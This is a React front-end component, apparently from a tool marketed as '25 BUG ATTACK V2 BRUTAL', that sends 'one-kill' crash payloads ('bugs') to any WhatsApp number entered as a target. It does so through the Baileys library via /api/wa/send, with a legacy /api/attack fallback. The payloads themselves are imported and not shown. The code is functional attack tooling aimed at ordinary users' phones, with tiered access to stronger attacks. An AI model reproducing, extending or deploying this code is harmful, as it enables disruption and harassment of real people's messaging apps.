"use client";
import { useState } from "react";
import { useApp } from "@/contexts/AppContext";
import { ATTACK_MENUS } from "@/lib/bugPayloads";
import SuccessNotification from "./SuccessNotification";
import LockedFeature from "./LockedFeature";
import CountryPicker from "./CountryPicker";
import TargetSwitcher from "./TargetSwitcher";
import { Country } from "@/lib/countries";

export default function AttackSection() {
  const { token, user } = useApp();
  const [selected, setSelected] = useState<string | null>(null);
  const [target, setTarget] = useState("");
  const [targetCountry, setTargetCountry] = useState<Country | null>(null);
  const [loading, setLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showLocked, setShowLocked] = useState(false);
  const [error, setError] = useState("");
  const [result, setResult] = useState<any>(null);

  const handleAttack = async () => {
    if (!selected) { setError("Pilih jenis serangan brutal V2 dulu!"); return; }
    if (!target.trim()) { setError("Nomor target tidak boleh kosong! Format: 628xxxx"); return; }
    setError("");
    setLoading(true);
    setResult(null);

    try {
      // Try real WA send first
      let res: Response;
      let data: any;
      
      try {
        res = await fetch("/api/wa/send", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${token}`,
          },
          body: JSON.stringify({ attackType: selected, target }),
        });

        const contentType = res.headers.get("content-type") || "";
        const text = await res.text();
        
        // Try parse JSON, if fails show HTML error
        try {
          data = JSON.parse(text);
        } catch (jsonErr) {
          if (text.includes("<html") || text.includes("<!DOCTYPE")) {
            throw new Error("Server mengembalikan HTML bukan JSON - kemungkinan API error atau session expired. Coba relogin atau cek koneksi WA di menu Pairing. Detail: " + text.slice(0, 200));
          } else {
            throw new Error(text.slice(0, 500));
          }
        }

        if (!res.ok) {
          if (data.code === "NOT_CONNECTED") {
            setError(`❌ ${data.error} — Buka menu Pairing WA dulu! Hubungkan WA pengirim.`);
          } else if (res.status === 403) {
            setShowLocked(true);
          } else {
            setError(data.error || `Gagal: ${res.status} - ${data.message || "Unknown error"}`);
          }
          return;
        }

        // Success
        setResult(data);
        setShowSuccess(true);
        return;

      } catch (fetchErr: any) {
        console.error("WA send failed, trying legacy attack endpoint:", fetchErr);
        
        // Fallback to legacy /api/attack endpoint
        try {
          const legacyRes = await fetch("/api/attack", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Authorization: `Bearer ${token}`,
            },
            body: JSON.stringify({ attackType: selected, target }),
          });

          const legacyText = await legacyRes.text();
          let legacyData: any;
          try {
            legacyData = JSON.parse(legacyText);
          } catch {
            throw new Error(`Legacy endpoint juga gagal: ${legacyText.slice(0, 300)}`);
          }

          if (!legacyRes.ok) {
            if (legacyRes.status === 403) setShowLocked(true);
            else setError(legacyData.error || `Legacy gagal: ${legacyRes.status}`);
            return;
          }

          setResult(legacyData);
          setShowSuccess(true);
          return;
        } catch (legacyErr: any) {
          throw new Error(`Keduanya gagal - WA: ${fetchErr.message} | Legacy: ${legacyErr.message}`);
        }
      }
    } catch (e: any) {
      console.error("Attack error:", e);
      setError(`❌ Gagal total: ${e.message}. Jika 'Unexpected token <', itu artinya server return HTML error page, bukan JSON. Cek: 1) Login masih valid? 2) WA sudah pairing? 3) Server logs. Coba relogin.`);
    } finally {
      setLoading(false);
    }
  };

  const handleSelectAttack = (id: string, basicAccess: boolean) => {
    if (user?.role === "user" && !basicAccess) {
      setShowLocked(true);
      return;
    }
    setSelected(id === selected ? null : id);
    setError("");
  };

  const selectedMenu = ATTACK_MENUS.find(m => m.id === selected);

  return (
    <>
      {showSuccess && <SuccessNotification onClose={() => setShowSuccess(false)} message={result?.message} />}
      {showLocked && <LockedFeature onClose={() => setShowLocked(false)} />}

      <div className="p-4 max-w-2xl mx-auto">
        <div className="text-center mb-5">
          <h2 className="digital-font text-[18px] font-black bg-gradient-to-br from-white to-[#ff0040] bg-clip-text text-transparent drop-shadow-[0_0_10px_rgba(255,0,64,0.6)]">
            ⚡ 25 BUG ATTACK V2 BRUTAL — REAL BAILEYS 120FPS — ONE KILL FIXED
          </h2>
          <p className="digital-font text-white/50 text-[9px] tracking-[1px] mt-1">PAYLOAD HITAM-PUTIH-MERAH NEON • 100% REAL WA • 120FPS SMOOTH • ERROR JSON FIXED</p>
        </div>

        <div className="grid grid-cols-1 gap-2 mb-4 max-h-[42vh] overflow-y-auto scrollbar-hide">
          {ATTACK_MENUS.map((menu) => {
            const isLocked = user?.role === "user" && !menu.basicAccess;
            const isSelected = selected === menu.id;
            const isDoomsday = menu.id === "doomsday-ultimate";
            return (
              <button
                key={menu.id}
                onClick={() => handleSelectAttack(menu.id, menu.basicAccess)}
                className="flex items-center gap-2.5 px-3 py-2.5 rounded-[9px] border text-left transition-all"
                style={{
                  borderColor: isSelected ? (isDoomsday ? "#ffffff" : "#ff0040") : isLocked ? "rgba(255,255,255,0.05)" : "rgba(255,255,255,0.08)",
                  background: isSelected ? (isDoomsday ? "linear-gradient(135deg, rgba(255,255,255,0.12), rgba(255,0,64,0.18))" : "linear-gradient(135deg, rgba(255,0,64,0.15), rgba(0,0,0,0.7))") : isLocked ? "rgba(0,0,0,0.2)" : "rgba(0,0,0,0.4)",
                  opacity: isLocked ? 0.45 : 1,
                  boxShadow: isSelected && isDoomsday ? "0 0 20px rgba(255,255,255,0.2), 0 0 30px rgba(255,0,64,0.2)" : isSelected ? "0 0 15px rgba(255,0,64,0.25)" : "none",
                }}
              >
                <span className="text-[18px] shrink-0" style={{ filter: isSelected ? "drop-shadow(0 0 6px #ff0040)" : "none" }}>{menu.icon}</span>
                <div className="flex-1 min-w-0">
                  <p className={`${isSelected ? "digital-font" : ""} text-[11px] font-bold m-0 whitespace-nowrap overflow-hidden text-ellipsis`} style={{ color: isLocked ? "rgba(255,255,255,0.3)" : isDoomsday ? "#fff" : isSelected ? "#fff" : "#ffffffcc", fontSize: isSelected ? "10px" : "11px" }}>
                    {isLocked ? "🔒 " : ""}{menu.name} {isDoomsday ? "☢️ ONE-KILL" : ""}
                  </p>
                  <p className="text-[9px] mt-0.5 leading-[1.3] whitespace-nowrap overflow-hidden text-ellipsis" style={{ color: isSelected ? "#ff9999" : "rgba(255,255,255,0.4)" }}>{menu.desc}</p>
                </div>
                {isSelected && <span className="text-[#ff0040] text-sm shrink-0 drop-shadow-[0_0_8px_#ff0040]">✓</span>}
                {isDoomsday && !isSelected && <span className="text-[10px] bg-[#ff0040] text-white px-1.5 py-0.5 rounded font-extrabold">ONE-KILL</span>}
              </button>
            );
          })}
        </div>

        {selectedMenu && (
          <div className="bg-gradient-to-br from-[rgba(255,0,64,0.08)] to-black/60 border border-[rgba(255,0,64,0.25)] border-l-[3px] border-l-[#ff0040] rounded-lg p-3 mb-3.5">
            <p className="digital-font text-white text-[10px] font-bold m-0 mb-1">{selectedMenu.icon} SELECTED V2: {selectedMenu.name}</p>
            <p className="text-[#ffaaaa] text-[10px] m-0 leading-[1.4]">{selectedMenu.desc}</p>
            <p className="digital-font text-white/40 text-[8px] mt-1.5">REAL BAILEYS • HEAVY PAYLOAD V2 • ONE-KILL READY • JSON ERROR FIXED • 120FPS</p>
          </div>
        )}

        <div className="glass-card-black-red rounded-xl p-[18px]">
          <TargetSwitcher currentTarget={target} onTargetChange={(newTarget) => setTarget(newTarget)} label="NOMOR TARGET SAAT INI" />

          <CountryPicker
            value={target}
            onChange={(phone, country, isValid) => {
              setTarget(phone.replace(/[^0-9+]/g, "").replace(/\+/g, ""));
              if (country) setTargetCountry(country);
            }}
            label="🌍 NOMOR TARGET REAL WA WORLDWIDE — BEBAS GANTI NEGARA"
            placeholder="812-3456-7890"
          />
          <div className="h-3" />

          {error && (
            <div className="bg-[rgba(255,0,64,0.12)] border border-[rgba(255,0,64,0.4)] rounded-lg p-3 text-[#ff5566] text-[11px] mb-3.5 text-left leading-[1.5]">
              <p className="font-bold m-0 mb-1">❌ Error:</p>
              <p className="m-0 whitespace-pre-wrap break-words">{error}</p>
              <p className="digital-font text-white/40 text-[8px] mt-2">Jika error JSON HTML, coba: 1) Relogin, 2) Pairing WA dulu, 3) Cek server logs Vercel</p>
            </div>
          )}

          {result && (
            <div className="bg-[rgba(0,255,136,0.08)] border border-[rgba(0,255,136,0.3)] rounded-lg p-2.5 mb-3">
              <p className="digital-font text-[#00ff88] text-[9px] m-0">✅ REAL WA TERKIRIM: {result.sent || 1}/{result.total || 1} CHUNKS • {result.jid || result.target} • {result.realWA ? "REAL BAILEYS" : "SIM"}</p>
            </div>
          )}

          <button onClick={handleAttack} disabled={loading || !selected} className="btn-gas-black-red w-full rounded-xl py-[15px] text-white text-sm font-black tracking-[1px] shadow-[0_0_20px_rgba(255,0,64,0.3)] disabled:opacity-55 disabled:cursor-not-allowed">
            {loading ? "⏳ MENGIRIM REAL BAILEYS HEAVY PAYLOAD ONE-KILL..." : "🔥 GAS TEKAN TOMBOL INI MBUD — KIRIM BUG REAL WA ONE-KILL 💀🔥"}
          </button>

          <p className="digital-font text-white/25 text-[8px] text-center mt-2.5 leading-[1.4]">REAL @whiskeysockets/baileys v6.7.18 • 120FPS • ONE-KILL PAYLOAD V3 • JSON FIXED • No HTML Error</p>
        </div>
      </div>
    </>
  );
}
